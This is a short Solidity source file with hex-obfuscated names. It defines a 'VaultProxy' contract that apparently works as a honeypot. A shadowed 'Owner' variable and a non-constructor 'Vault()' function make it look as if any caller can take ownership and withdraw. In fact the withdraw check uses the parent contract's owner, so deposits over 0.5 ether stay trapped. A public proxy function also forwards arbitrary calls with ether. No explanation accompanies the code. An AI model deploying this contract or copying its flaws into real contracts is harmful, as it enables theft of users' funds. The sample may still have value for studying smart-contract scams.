// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0x9e6843 { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0xffb53e(address _0x4f29a2) public _0x9e6843 { Owner = _0x4f29a2; }
    function _0xba42a2(address _0xdb8561, bytes data) public payable {
        _0xdb8561.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0xadc8dd();
        }
    }

    function _0xadc8dd() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0x247606(uint256 _0x31a8a6) public _0x9e6843 {
        if (_0x31a8a6>0 && Deposits[msg.sender]>=_0x31a8a6) {
            msg.sender.transfer(_0x31a8a6);
        }
    }
}